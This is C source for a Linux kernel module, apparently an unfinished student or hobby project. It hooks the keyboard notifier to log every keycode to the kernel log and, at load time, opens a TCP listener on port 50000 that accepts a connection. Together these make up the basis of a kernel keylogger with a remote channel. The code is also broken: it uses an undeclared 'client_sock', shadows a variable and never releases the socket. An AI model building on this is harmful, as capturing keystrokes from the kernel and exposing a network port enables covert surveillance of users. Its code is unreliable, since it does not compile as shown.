#include <linux/module.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/printk.h>
#include <linux/net.h>

#define PORT 50000

static int keyboard_callback(struct notifier_block *nblock, unsigned long code, void *_param)
{
    struct keyboard_notifier_param *param = _param;
    
    // Check if it's a key event
    if (code == KBD_KEYCODE)
    {
        // Access the keyboard event data
        struct keyboard_notifier_param param = *(struct keyboard_notifier_param *)_param;
        struct vc_data *vc = param.vc;
        unsigned int keycode = param.value;
        
        // Process the key event as needed
        // ...
        printk(KERN_INFO "Keycode: %u\n", keycode);
    }
    
    // Return NOTIFY_OK to allow further processing of the event
    return NOTIFY_OK;
}

static struct notifier_block keyboard_nb = {
    .notifier_call = keyboard_callback
};

// Creates socket
static int create_socket(struct socket **sock) {
    struct sockaddr_in server_addr;
    int ret;

    // Create TCP socket
    ret = sock_create_kern(&init_net, PF_INET, SOCK_STREAM, IPPROTO_TCP, sock);
    if (ret < 0) {
        printk(KERN_ERR "failed to create socket\n");
        return ret;
    }

    // Setup server address and bind it to the socket
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);


    // Bind socket to server address
    // ret = kernel_bind(sock, (struct sockaddr*)&saddr, sizeof(saddr));
    ret = (*sock)->ops->bind(*sock, (struct sockaddr *)&server_addr, sizeof(server_addr));
    if (ret < 0) {
        printk(KERN_ERR "failed to bind socket\n");
        return ret;
    }

    // Listen for incoming connections
    // ret = kernel_listen(sock, 1);
    ret = (*sock)->ops->listen(*sock, 1);
    if (ret < 0) {
        printk(KERN_ERR "failed to listen on socket\n");
        return ret;
    }

    // Accept incoming connections
    // ret = kernel_accept(sock, &client_sock, 0);
    ret = (*sock)->ops->accept(*sock, &client_sock, 0);
    if (ret < 0) {
        printk(KERN_ERR "failed to accept connection\n");
        return ret;
    }

    return ret;

}

static int __init keyboard_module_init(void)
{
    struct socket *sock;
    
    // Create server
    create_socket(&sock);

    // Register the keyboard notifier
    register_keyboard_notifier(&keyboard_nb);

    return 0;
}

static void __exit keyboard_module_exit(void)
{
    // Unregister the keyboard notifier
    unregister_keyboard_notifier(&keyboard_nb);
}

module_init(keyboard_module_init);
module_exit(keyboard_module_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Matheus V. Bellini & Angelo B. Guido");
MODULE_DESCRIPTION("Keyboard Module");